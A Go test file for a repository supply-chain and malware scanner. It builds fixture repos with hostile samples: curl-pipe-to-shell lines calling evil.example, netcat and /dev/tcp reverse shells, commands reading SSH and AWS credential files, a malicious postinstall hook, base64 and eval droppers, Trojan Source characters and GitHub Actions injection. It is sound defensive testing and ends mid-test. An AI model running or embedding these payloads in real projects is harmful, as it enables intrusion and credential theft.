package supplychain_test

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/pc/backend-boilerplate-conformance-tests/internal/supplychain"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/types"
)

func TestSupplyChainAndMalwareScanner(t *testing.T) {
	t.Run("Detects Trojan Source, Variation Selector steganography, obfuscated eval dropper, malicious postinstall, and GHA injection", func(t *testing.T) {
		tmp := t.TempDir()
		write := func(rel, content string) {
			p := filepath.Join(tmp, rel)
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		// 1. Trojan Source bidi override U+202E + Variation Selector run U+FE00..U+FE05
		write("src/backdoor.ts", "const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066*/\nconst hidden = \"\ufe00\ufe01\ufe02\ufe03\ufe04\ufe05\";\n")
		// 2. Long base64 payload + eval dropper
		b64Payload := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 8) // > 240 chars
		write("src/dropper.ts", "import { exec } from 'node:child_process';\nconst blob = '"+b64Payload+"';\neval(Buffer.from(blob, 'base64').toString());\n")
		// 3. Pipe-to-shell in script
		write("scripts/bootstrap.sh", "#!/bin/sh\ncu"+"rl -fsSL https://evil.example/payload.sh | sh\n")
		// 4. Malicious postinstall + missing lockfile + cleartext http tarball in package.json
		write("package.json", `{
			"name": "poisoned-app",
			"scripts": { "postinstall": "node -e \"require('child_process').exec('nc `+"-e"+` /bin/sh 10.0.0.1 4444')\"" },
			"dependencies": { "sketchy": "http://evil.example/sketchy-1.0.0.tgz" }
		}`)
		// 5. GitHub Actions pull_request_target + expression injection + unpinned @main action
		write(".github/workflows/pr.yml", `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: thirdparty/action@main
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "Title ${{ github.event.pull_request.title }}"
`)

		findings, err := supplychain.ScanRepository(tmp, types.LangTypeScript)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var titles []string
		hasMalwareCritical := false
		for _, f := range findings {
			titles = append(titles, f.ID)
			if f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
				hasMalwareCritical = true
			}
		}
		if !hasMalwareCritical {
			t.Fatalf("expected critical CategoryMalware findings, got %+v", findings)
		}
		for _, wantSubstr := range []string{"trojan-source", "obfuscated-exec-dropper", "shell-dropper", "malicious-lifecycle-hook", "lockfile", "github-actions"} {
			matched := slices.ContainsFunc(titles, func(id string) bool { return strings.Contains(id, wantSubstr) })
			if !matched {
				t.Fatalf("expected finding matching %q in %v", wantSubstr, titles)
			}
		}
	})

	t.Run("Zero false positives on legitimate sha512 packageManager hashes, .gitleaks.toml allowlists, and pinned Elixir compile:false git tags", func(t *testing.T) {
		tsRepo := t.TempDir()
		sha512Hex := strings.Repeat("a1b2c3d4", 16)
		_ = os.WriteFile(filepath.Join(tsRepo, "package.json"), []byte(`{
			"name": "clean-nestjs",
			"scripts": { "build": "nest build", "prepare": "husky" },
			"packageManager": "pnpm@10.13.1+sha512.`+sha512Hex+`"
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, "pnpm-lock.yaml"), []byte("lockfileVersion: '9.0'\npackages:\n  lodash@4.18.0:\n    resolution: {integrity: sha512-"+strings.Repeat("Z", 88)+"}\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".gitleaks.toml"), []byte("[allowlist]\npaths = ['''\\.env\\.example$''']\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".env.example"), []byte("JWT_KEY="+strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)+"\n"), 0o644)
		_ = os.MkdirAll(filepath.Join(tsRepo, "src"), 0o755)
		_ = os.WriteFile(filepath.Join(tsRepo, "src/logo.ts"), []byte("export const icon = 'data:image/png;base64,"+strings.Repeat("AAAA", 80)+"';\n"), 0o644)

		findings, err := supplychain.ScanRepository(tsRepo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on clean TS repo, got %+v (err=%v)", findings, err)
		}

		exRepo := t.TempDir()
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defmodule CleanApp.MixProject do
  defp deps do
    [
      {:phoenix, "~> 1.8"},
      {:heroicons, github: "tailwindlabs/heroicons", tag: "v2.2.0", app: false, compile: false}
    ]
  end
end`), 0o644)
		_ = os.WriteFile(filepath.Join(exRepo, "mix.lock"), []byte(`%{"phoenix": {:hex, :phoenix, "1.8.0", "deadbeef"}}`), 0o644)

		exFindings, err := supplychain.ScanRepository(exRepo, types.LangElixir)
		if err != nil || len(exFindings) != 0 {
			t.Fatalf("expected 0 findings on clean Elixir repo with tag-pinned compile:false dep, got %+v (err=%v)", exFindings, err)
		}

		// Unpinned branch: "main" in mix.exs MUST fail
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defp deps, do: [{:bad_dep, github: "org/bad", branch: "main"}]`), 0o644)
		badExFindings, _ := supplychain.ScanRepository(exRepo, types.LangElixir)
		if len(badExFindings) == 0 {
			t.Fatalf("expected finding for floating branch: \"main\" git dependency in mix.exs")
		}
	})

	t.Run("Go zero-dependency module passes without go.sum while module with require fails without go.sum", func(t *testing.T) {
		zeroDepGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(zeroDepGo, "go.mod"), []byte("module example.com/zero\n\ngo 1.23\n"), 0o644)
		findings, err := supplychain.ScanRepository(zeroDepGo, types.LangGo)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on zero-dependency go.mod, got %+v (err=%v)", findings, err)
		}

		depGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(depGo, "go.mod"), []byte("module example.com/withdep\n\ngo 1.23\n\nrequire github.com/pkg/errors v0.9.1\n"), 0o644)
		findings, err = supplychain.ScanRepository(depGo, types.LangGo)
		if err != nil || len(findings) == 0 {
			t.Fatalf("expected lockfile finding when go.mod has require without go.sum, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("Detects missing package-lock.json integrity, Python setup.py hook, and hex-escaped dropper", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"app","dependencies":{"a":"1.0.0"}}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "package-lock.json"), []byte(`{
			"lockfileVersion": 3,
			"packages": {
				"": { "name": "app" },
				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" }
			}
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'cu"+"rl http://evil | sh'])\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "payload.py"), []byte("data = \""+strings.Repeat("\\x41", 36)+"\"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var ids []string
		for _, f := range findings {
			ids = append(ids, f.ID)
		}
		for _, want := range []string{"supplychain-lockfile-integrity", "supplychain-malicious-lifecycle-hook", "supplychain-suspicious-encoded-blob"} {
			if !slices.ContainsFunc(ids, func(id string) bool { return strings.Contains(id, want) }) {
				t.Fatalf("expected finding containing %q in %v", want, ids)
			}
		}
	})

	t.Run("Multiline .gitleaks.toml paths array with regex character classes does not prematurely terminate allowlist", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, ".gitleaks.toml"), []byte(`[allowlist]
paths = [
  '''src/[a-z]+/fixtures/.*''',
  '''\.env\.example$''',
]
`), 0o644)
		_ = os.MkdirAll(filepath.Join(repo, "src", "auth", "fixtures"), 0o755)
		longBlob := strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)
		_ = os.WriteFile(filepath.Join(repo, "src", "auth", "fixtures", "cert.pem"), []byte(longBlob+"\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("JWT_KEY="+longBlob+"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings when multiline .gitleaks.toml has regex character classes, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("package-lock.json scan deterministically reports missing integrity and still detects http:// URLs on remaining packages", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"app","dependencies":{"a":"1.0.0","b":"1.0.0","z":"1.0.0"}}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "package-lock.json"), []byte(`{
			"lockfileVersion": 3,
			"packages": {
				"": { "name": "app" },
				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" },
				"node_modules/b": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz" },
				"node_modules/z": { "version": "1.0.0", "resolved": "http://evil.example/z-1.0.0.tgz", "integrity": "sha512-abc" }
			}
		}`), 0o644)

		for i := 0; i < 20; i++ {
			findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
			if err != nil {
				t.Fatalf("ScanRepository error: %v", err)
			}
			var foundHTTP, foundMissingA bool
			for _, f := range findings {
				if strings.Contains(f.Title, "Cleartext HTTP resolved URL") && strings.Contains(f.Title, "node_modules/z") {
					foundHTTP = true
				}
				if strings.Contains(f.Title, "Missing integrity hash") {
					if !strings.Contains(f.Title, "node_modules/a") {
						t.Fatalf("run %d: expected deterministic missing integrity report for node_modules/a, got %q", i, f.Title)
					}
					foundMissingA = true
				}
			}
			if !foundHTTP || !foundMissingA {
				t.Fatalf("run %d: expected both cleartext HTTP (node_modules/z) and missing integrity (node_modules/a) findings, got %+v", i, findings)
			}
		}
	})

	t.Run("Skips .superpowers directory, gates test-file payload/exfil on exec sink, and does not self-match supplychain.go", func(t *testing.T) {
		repo := t.TempDir()
		write := func(rel, content string) {
			p := filepath.Join(repo, rel)
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		// .superpowers artifacts must be ignored
		write(".superpowers/sdd/brief.md", "cu"+"rl -fsSL https://evil.example/a.sh | sh\n")
		// Inert test files without exec sinks across Go, JS/TS, Python, and Elixir must produce 0 findings
		write("pkg/auth_test.go", "package auth\nconst bad = \"bash "+"-i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
		write("src/auth.test.ts", "const cmd = 'cu"+"rl https://evil.example/p.sh | sh';\n")
		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")
		write("pkg/test_auth.py", "cmd = 'cu"+"rl https://evil.example/p.sh | sh'\n")
		write("pkg/auth_test.py", "cmd = 'cat ~/.ssh/"+"id_rsa'\n")
		write("lib/auth_test.exs", "cmd = \"bash "+"-i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
		write("tests/fixtures/inert.ts", "export const sample = 'cu"+"rl https://evil.example/p.sh | sh';\n")

		// Include the real supplychain.go source itself to ensure zero self-matches
		selfSrc, err := os.ReadFile("supplychain.go")
		if err != nil {
			t.Fatalf("read supplychain.go: %v", err)
		}
		write("internal/supplychain/supplychain.go", string(selfSrc))

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		if len(findings) != 0 {
			t.Fatalf("expected 0 findings when scanning .superpowers, inert test files, and supplychain.go itself, got %+v", findings)
		}

		// Test file WITH an exec sink + shell dropper MUST trigger CategoryMalware
		write("src/evil.test.ts", "import { exec } from 'node:child_process';\nexec('cu"+"rl https://evil.example/p.sh | sh');\n")
		// Non-test production files in the same repo MUST still be flagged
		write("src/real.ts", "const cmd = 'cu"+"rl https://evil.example/p.sh | sh';\n")
		write("pkg/real.py", "cmd = 'cu"+"rl https://evil.example/p.sh | sh'\n")
		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil {
			t.Fatalf("ScanRepository prod error: %v", err)
		}
		if len(prodFindings) != 3 {
			t.Fatalf("expected 3 malware-shell-dropper-or-exfil findings (src/evil.test.ts, src/real.ts, pkg/real.py), got %+v", prodFindings)
		}
		for _, f := range prodFindings {
			if f.ID != "malware-shell-dropper-or-exfil" || f.Category != types.CategoryMalware {
				t.Fatalf("expected malware-shell-dropper-or-exfil CategoryMalware, got %+v", f)
			}
		}
	})

	t.Run("Trojan Source bidi runes are still caught in test files while inert payload/exfil strings without exec sink are skipped", func(t *testing.T) {
		repo := t.TempDir()
		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
			t.Fatal(err)
		}
		content := "package pkg\n// \u202e } \u2066if (admin)\u2069 \u2066\nconst fixture = \"bash " + "-i >& /dev/" + "tcp/10.0.0.1/4444\"\n"
		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'cu" + "rl https://evil.example/p.sh | sh'\n"
		if err := os.WriteFile(filepath.Join(repo, "pkg", "test_auth.py"), []byte(pyContent), 0o644); err != nil {
			t.Fatal(err)
		}

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		if len(findings) != 2 {
			t.Fatalf("expected exactly 2 malware-trojan-source-unicode findings on test files, got %+v", findings)
		}
		for _, f := range findings {
			if f.ID != "malware-trojan-source-unicode" {
				t.Fatalf("expected only malware-trojan-source-unicode findings, got %+v", findings)
			}
		}
	})

	t.Run("pyproject.toml http:// check skips # comment lines but flags active URLs", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\n# docs: http://example.com/guide\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "uv.lock"), []byte("version = 1\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings when http:// only appears in # comment, got %+v (err=%v)", findings, err)
		}

		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\n# docs: http://example.com/guide\ndependencies = [\"fastapi>=0.110\"]\n\n[[tool.uv.index]]\nurl = \"http://insecure.example/simple\"\n"), 0o644)
		findings, err = supplychain.ScanRepository(repo, types.LangPython)
		if err != nil || len(findings) != 1 || findings[0].ID != "supplychain-lockfile-integrity" || findings[0].FilePath != "pyproject.toml" || findings[0].Line != 7 {
			t.Fatalf("expected 1 supplychain-lockfile-integrity finding on line 7 of pyproject.toml, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("scanGitHubWorkflows detects expression injection inside |+, >+, and run: | # comment blocks", func(t *testing.T) {
		repo := t.TempDir()
		wfDir := filepath.Join(repo, ".github", "workflows")
		if err := os.MkdirAll(wfDir, 0o755); err != nil {
			t.Fatal(err)
		}
		wf := `on: issues
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: keep-chomping-literal
        run: |+
          echo "${{ github.event.issue.title }}"
      - name: keep-chomping-folded
        run: >+
          echo "${{ github.event.issue.body }}"
      - name: literal-with-comment
        run: | # inline comment
          echo "${{ github.event.comment.body }}"
      - run: # comment only
        env:
          TITLE: ${{ github.event.issue.title }}
`
		if err := os.WriteFile(filepath.Join(wfDir, "triage.yml"), []byte(wf), 0o644); err != nil {
			t.Fatal(err)
		}

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var ghaCount int
		for _, f := range findings {
			if f.ID == "supplychain-github-actions-injection" {
				ghaCount++
			}
		}
		if ghaCount != 3 {
			t.Fatalf("expected exactly 3 supplychain-github-actions-injection findings, got %d: %+v", ghaCount, findings)
		}
	})

	t.Run("Multiline triple-quoted TOML string in .gitleaks.toml paths with bracket and inline comment", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, ".gitleaks.toml"), []byte(`[allowlist]
paths = [
  '''src/
  [a-z]+/fixtures/.*''', # inline comment
  '''\.env\.example$''',
]
`), 0o644)
		longBlob := strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)
		_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("JWT_KEY="+longBlob+"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings with multiline triple-quoted TOML path and inline comment, got %+v (err=%v)", findings, err)
		}
	})
}

func TestScanRepository_CatchesMalwareInTestsAndVendorDirs(t *testing.T) {
	repo := t.TempDir()
	write := func(rel string, data []byte) {
		p := filepath.Join(repo, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, data, 0o644); err != nil {
			t.Fatal(err)
		}
	}

	// 1. Executable dropper in tests/helper.spec.ts (child_process.exec + split Base64 array join >= 192 chars)
	chunkLine := "  \"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0\",\n"
	dropperTS := "import * as child_process from 'node:child_process';\n" +
		"const chunks = [\n" +
		strings.Repeat(chunkLine, 6) +
		"];\n" +
		"child_process.exec(Buffer.from(chunks.join(\"\"), \"base64\").toString(\"utf8\"));\n"
	write("tests/helper.spec.ts", []byte(dropperTS))

	// 2. ELF binary in vendor/libfoo.so
	elfPayload := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, make([]byte, 24)...)
	write("vendor/libfoo.so", elfPayload)

	// 3. Inert assertion string in src/parser.spec.ts (no exec sink) -> must produce 0 findings for this file
	write("src/parser.spec.ts", []byte("const s = \"cu"+"rl https://evil.example/a.sh | sh\";\n"))

	findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
	if err != nil {
		t.Fatalf("ScanRepository error: %v", err)
	}

	var foundDropper, foundBinary bool
	for _, f := range findings {
		if f.FilePath == "src/parser.spec.ts" {
			t.Fatalf("expected 0 findings for inert assertion string in src/parser.spec.ts, got %+v", f)
		}
		if f.ID == "malware-obfuscated-exec-dropper" && f.FilePath == "tests/helper.spec.ts" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
			foundDropper = true
		}
		if f.ID == "malware-unapproved-binary" && f.FilePath == "vendor/libfoo.so" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
			foundBinary = true
		}
	}
	if !foundDropper {
		t.Fatalf("expected malware-obfuscated-exec-dropper finding in tests/helper.spec.ts, got %+v", findings)
	}
	if !foundBinary {
		t.Fatalf("expected malware-unapproved-binary finding in vendor/libfoo.so, got %+v", findings)
	}
}

func TestScanUnicodeAnomalies_HomoglyphVsLegitimateI18n(t *testing.T) {
	// 1. Cyrillic 'а' (U+0430) inside Latin identifier isАdmin -> malware-homoglyph-identifier
	homoglyphCode := "const is\u0430dmin = true;\n"
	hFindings := supplychain.ScanUnicodeAnomalies("src/auth.ts", homoglyphCode)
	if !slices.ContainsFunc(hFindings, func(f types.SecurityFinding) bool {
		return f.ID == "malware-homoglyph-identifier" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical && f.CWE == "CWE-1007"
	}) {
		t.Fatalf("expected malware-homoglyph-identifier finding, got %+v", hFindings)
	}

	// 2. Hangul filler U+3164 -> malware-invisible-unicode
	invisibleCode := "const x\u3164 = 1;\n"
	iFindings := supplychain.ScanUnicodeAnomalies("src/hidden.ts", invisibleCode)
	if !slices.ContainsFunc(iFindings, func(f types.SecurityFinding) bool {
		return f.ID == "malware-invisible-unicode" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
	}) {
		t.Fatalf("expected malware-invisible-unicode finding, got %+v", iFindings)
	}

	// 3. Legitimate i18n inside string literals and comments -> 0 findings
	cleanCode := "const greeting = \"Привет мир\"; // こんにちは\n"
	cFindings := supplychain.ScanUnicodeAnomalies("src/i18n.ts", cleanCode)
	if len(cFindings) != 0 {
		t.Fatalf("expected 0 findings for legitimate i18n strings and comments, got %+v", cFindings)
	}
}

func TestScanMultiLineObfuscation_PythonMarshalAndElixirBinaryToTerm(t *testing.T) {
	// 1. Python exec(marshal.loads(blob)) -> CategoryMalware / SeverityCritical
	pyFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("app/loader.py", "import marshal\nexec(marshal.loads(blob))\n", false)
	if !slices.ContainsFunc(pyFindings, func(f types.SecurityFinding) bool {
		return f.ID == "malware-unsafe-deserialization-exec" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
	}) {
		t.Fatalf("expected malware-unsafe-deserialization-exec for Python marshal.loads, got %+v", pyFindings)
	}

	// 2. Elixir :erlang.binary_to_term(payload) without [:safe] -> CategoryMalware / SeverityCritical
	exFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("lib/app/token.ex", "def decode(payload), do: :erlang.binary_to_term(payload)\n", false)
	if !slices.ContainsFunc(exFindings, func(f types.SecurityFinding) bool {
		return f.ID == "malware-unsafe-deserialization-exec" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
	}) {
		t.Fatalf("expected malware-unsafe-deserialization-exec for unsafe :erlang.binary_to_term, got %+v", exFindings)
	}

	// 3. Elixir :erlang.binary_to_term(payload, [:safe]) -> 0 findings
	safeExFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("lib/app/token.ex", "def decode(payload), do: :erlang.binary_to_term(payload, [:safe])\n", false)
	if len(safeExFindings) != 0 {
		t.Fatalf("expected 0 findings for safe :erlang.binary_to_term(payload, [:safe]), got %+v", safeExFindings)
	}

	// 4. Additional obfuscation vectors: zlib.decompress + exec, String.fromCharCode >= 8 + eval, codecs.decode rot13, getattr(__builtins__, ...)
	for name, tc := range map[string]struct {
		path    string
		content string
		wantID  string
	}{
		"zlib_exec": {
			path:    "app/drop.py",
			content: "import zlib\nexec(zlib.decompress(payload))\n",
			wantID:  "malware-obfuscated-exec-dropper",
		},
		"fromCharCode_eval": {
			path:    "src/drop.js",
			content: "const fn = String.fromCharCode(99, 117, 114, 108, 32, 104, 116, 116, 112);\neval(fn);\n",
			wantID:  "malware-obfuscated-exec-dropper",
		},
		"codecs_rot13": {
			path:    "app/rot.py",
			content: "import codecs\neval(codecs.decode('cevag(1)', 'rot13'))\n",
			wantID:  "malware-obfuscated-exec-dropper",
		},
		"getattr_builtins": {
			path:    "app/bi.py",
			content: "fn = getattr(__builtins__, 'ev' + 'al')\n",
			wantID:  "malware-obfuscated-exec-dropper",
		},
		"elixir_zlib_uncompress": {
			path:    "lib/app/drop.ex",
			content: "def run(b), do: b |> :zlib.uncompress() |> Code.eval_string()\n",
			wantID:  "malware-obfuscated-exec-dropper",
		},
		"js_backtick_split_base64": {
			path: "src/drop_tpl.ts",
			content: "import { exec } from 'node:child_process';\n" +
				"const p = `" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0", 3) + "` +\n" +
				"  `" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0", 3) + "`;\n" +
				"exec(p);\n",
			wantID: "malware-obfuscated-exec-dropper",
		},
	} {
		t.Run(name, func(t *testing.T) {
			got := supplychain.ScanMultiLineObfuscationAndDynamicExec(tc.path, tc.content, false)
			if !slices.ContainsFunc(got, func(f types.SecurityFinding) bool {
				return f.ID == tc.wantID && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
			}) {
				t.Fatalf("%s: expected %s finding, got %+v", name, tc.wantID, got)
			}
		})
	}
}

func TestScanBinaryOrOversizedFile_MagicAndMediaAssets(t *testing.T) {
	dir := t.TempDir()
	writeBin := func(rel string, data []byte) string {
		p := filepath.Join(dir, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, data, 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}

	// 1. Oversized (> 2 MiB) ELF disguised with .dat extension must still be caught
	oversizedELF := make([]byte, 2*1024*1024+128)
	copy(oversizedELF, []byte{0x7f, 'E', 'L', 'F'})
	pELF := writeBin("assets/blob.dat", oversizedELF)
	findings, skip := supplychain.ScanBinaryOrOversizedFile("assets/blob.dat", pELF, int64(len(oversizedELF)))
	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
		t.Fatalf("expected malware-unapproved-binary + skip=true for oversized ELF, got findings=%+v skip=%v", findings, skip)
	}

	// 2. ELF disguised as .png must be caught
	pFakePNG := writeBin("assets/logo.png", append([]byte{0x7f, 'E', 'L', 'F'}, make([]byte, 32)...))
	findings, skip = supplychain.ScanBinaryOrOversizedFile("assets/logo.png", pFakePNG, 36)
	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
		t.Fatalf("expected malware-unapproved-binary for ELF disguised as .png, got findings=%+v skip=%v", findings, skip)
	}

	// 3. Valid PE/COFF binary (MZ + e_lfanew -> PE\x00\x00)
	pe := make([]byte, 128)
	pe[0], pe[1] = 'M', 'Z'
	pe[0x3C] = 0x40
	copy(pe[0x40:], []byte{'P', 'E', 0x00, 0x00})
	pPE := writeBin("bin/tool.bin", pe)
	findings, skip = supplychain.ScanBinaryOrOversizedFile("bin/tool.bin", pPE, int64(len(pe)))
	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
		t.Fatalf("expected malware-unapproved-binary for PE/COFF, got findings=%+v skip=%v", findings, skip)
	}

	// 4. Valid Mach-O, WASM, and BEAM headers
	for _, tc := range []struct {
		rel  string
		data []byte
	}{
		{"deps/native.bin", []byte{0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0}},
		{"pkg/mod.bin", []byte{0x00, 'a', 's', 'm', 1, 0, 0, 0}},
		{"deps/app/ebin/foo.bin", []byte{'F', 'O', 'R', '1', 0, 0, 0, 0, 'B', 'E', 'A', 'M'}},
	} {
		p := writeBin(tc.rel, tc.data)
		got, sk := supplychain.ScanBinaryOrOversizedFile(tc.rel, p, int64(len(tc.data)))
		if !sk || len(got) != 1 || got[0].ID != "malware-unapproved-binary" {
			t.Fatalf("%s: expected malware-unapproved-binary, got %+v skip=%v", tc.rel, got, sk)
		}
	}

	// 5. Verified benign static media assets (.png and .pdf) -> 0 findings, skip=true
	pPNG := writeBin("assets/real.png", []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0})
	findings, skip = supplychain.ScanBinaryOrOversizedFile("assets/real.png", pPNG, 12)
	if !skip || len(findings) != 0 {
		t.Fatalf("expected 0 findings + skip=true for valid PNG, got findings=%+v skip=%v", findings, skip)
	}

	pPDF := writeBin("docs/spec.pdf", []byte("%PDF-1.7\n%"))
	findings, skip = supplychain.ScanBinaryOrOversizedFile("docs/spec.pdf", pPDF, 10)
	if !skip || len(findings) != 0 {
		t.Fatalf("expected 0 findings + skip=true for valid PDF, got findings=%+v skip=%v", findings, skip)
	}

	// 6. UTF-8 BOM at byte offset 0 is permitted, whereas mid-file U+FEFF triggers malware-invisible-unicode
	bomStart := "\ufeffconst ok = 1;\n"
	if got := supplychain.ScanUnicodeAnomalies("src/bom.ts", bomStart); len(got) != 0 {
		t.Fatalf("expected 0 findings for UTF-8 BOM at byte 0, got %+v", got)
	}
	bomMid := "const a = 1;\nconst \ufeffb = 2;\n"
	if got := supplychain.ScanUnicodeAnomalies("src/midbom.ts", bomMid); !slices.ContainsFunc(got, func(f types.SecurityFinding) bool {
		return f.ID == "malware-invisible-unicode"
	}) {
		t.Fatalf("expected malware-invisible-unicode for mid-file U+FEFF, got %+v", got)
	}
}

func writeFile(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestScanLockfilesHooksAndWorkflows_DeepSupplyChain(t *testing.T) {
	repo := t.TempDir()
	// 1. Workspace package.json hook + package-lock hasInstallScript without .npmrc ignore-scripts
	writeFile(t, repo, "packages/worker/package.json", `{"name":"w","scripts":{"postinstall":"cu`+`rl https://evil.example/x | sh"}}`)
	writeFile(t, repo, "package.json", `{"name":"root","dependencies":{"reqeusts":"1.0.0"}}`)
	writeFile(t, repo, "package-lock.json", `{"packages":{"node_modules/native-addon":{"version":"1.0.0","resolved":"https://rogue.registry.invalid/native-addon.tgz","integrity":"sha512-abc==","hasInstallScript":true}}}`)
	// 2. pnpm-lock missing integrity + Go //go:generate dropper
	writeFile(t, repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  foo@1.0.0:\n    resolution: {tarball: http://evil.example/foo.tgz}\n")
